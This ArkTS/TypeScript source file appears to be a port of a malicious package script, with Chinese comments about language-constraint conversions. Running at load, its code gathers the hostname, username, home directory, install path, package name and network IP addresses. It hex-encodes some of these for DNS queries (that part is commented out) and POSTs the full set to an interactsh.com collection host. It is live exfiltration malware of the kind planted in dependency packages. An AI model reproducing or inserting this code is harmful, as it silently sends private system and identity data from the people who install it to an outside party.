// 应用ArkTS约束：使用let/const代替var（约束9）
import os from 'os'; // 假设模块存在或已适配
import dns from 'dns';
import querystring from 'querystring';
import https from 'https';
import fs from 'fs';
import path from 'path';
import packageJSON from './package.ets'; // 约束60：改用import

const packageName = packageJSON.name;

// 约束1：添加参数和返回类型标注
function getFiles(paths: string[]): string[] {
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) { // 约束9：使用let
        let mpath = paths[j];
        let files = fs.readdirSync(mpath); // 约束75：标准库限制可能需调整
        for (let i = 0; i < files.length; i++) { // 约束9：使用let
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

// 约束1：添加参数和返回类型，替换Buffer实现（约束75）
function toHex(data: string): string {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(data);
    let hex = '';
    for (const byte of bytes) {
        hex += byte.toString(16).padStart(2, '0');
    }
    return hex;
}

// 约束1：添加返回类型标注
function gethttpips(): string[] {
    let str: string[] = [];
    let networkInterfaces = os.networkInterfaces();
    // 约束41：改用Object.keys遍历
    const interfaces = Object.keys(networkInterfaces);
    for (let j = 0; j < interfaces.length; j++) {
        let item = interfaces[j];
        if (item != "lo") {
            let addresses = networkInterfaces[item];
            if (addresses) {
                for (let i = 0; i < addresses.length; i++) {
                    str.push(addresses[i].address);
                }
            }
        }
    }
    return str;
}

function getIps(): string {
    let str = "";
    let networkInterfaces = os.networkInterfaces();
    const interfaces = Object.keys(networkInterfaces);
    for (let j = 0; j < interfaces.length; j++) {
        let item = interfaces[j];
        if (item != "lo") {
            let addresses = networkInterfaces[item];
            if (addresses) {
                for (let i = 0; i < addresses.length; i++) {
                    str += toHex(addresses[i].address) + ".";
                }
            }
        }
    }
    return str.slice(0, -1);
}

// 约束1：参数类型标注
function getPathChunks(filePath: string): string {
    let str = "p";
    let chunks = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    str = str.slice(0, -1) + "p";
    return str;
}

interface PackageData {
    hn: string;
    p: string;
    c: string;
    un: string;
    hd: string;
}

function toName(pkg: PackageData): string[] {
    let queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    let baseStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (baseStr.length > 255) {
        // 简化处理逻辑，实际需要分块处理
        queries.push(baseStr.substring(0, 255));
    } else {
        queries.push(baseStr);
    }
    return queries;
}

// 约束24：使用类替代对象字面量类型
class TrackingData implements PackageData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    v: string;
    ip: string;

    constructor() {
        this.p = packageName;
        this.c = __dirname; // 可能需要适配路径获取方式
        this.hd = os.homedir();
        this.hn = os.hostname();
        this.un = os.userInfo().username;
        this.v = packageJSON.version;
        this.ip = JSON.stringify(gethttpips());
    }
}

const td = new TrackingData();
let qs = toName(td);

// 约束75：标准库限制，注释DNS部分
// qs.forEach((query) => {
//     dns.lookup(query, (err) => {});
// });

// 约束1：类型标注
const trackingData = JSON.stringify(td);
let postData = querystring.stringify({
    msg: trackingData,
});

// 约束1：配置对象类型标注
let options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

// 约束26：保持箭头函数
let req = https.request(options, (res) => {
    res.on("data", (d) => {});
});

req.on("error", (e) => {});
req.write(postData);
req.end();
